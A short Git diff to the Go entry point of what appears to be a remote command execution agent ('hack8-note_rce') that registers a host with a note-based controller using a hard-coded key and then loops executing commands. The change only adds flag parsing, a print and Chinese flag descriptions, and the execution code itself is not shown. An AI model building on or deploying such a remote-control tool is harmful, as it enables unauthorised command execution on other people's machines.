@@ -5,6 +5,7 @@ package main
 import (
 	"bytes"
 	"flag"
+	"fmt"
 	"github.com/lifei6671/gorand"
 	. "hack8-note_rce/Util"
 	"os/exec"
@@ -20,8 +21,10 @@ func main() {
 	noteid := gorand.RandomAlphabetic(30)
 	var notekey string
 	var admin string
-	flag.StringVar(&notekey, "key", "zhu1234554321zhu", "string flag value")
-	flag.StringVar(&admin, "admin", "ocis", "string flag value")
+	flag.StringVar(&notekey, "key", "zhu1234554321zhu", "加密参数")
+	flag.StringVar(&admin, "admin", "ocis", "note 地址")
+	flag.Parse()
+	fmt.Println(admin)
 	AddHost(admin, notekey, noteid) //添加主机
 
 	//循环命令执行
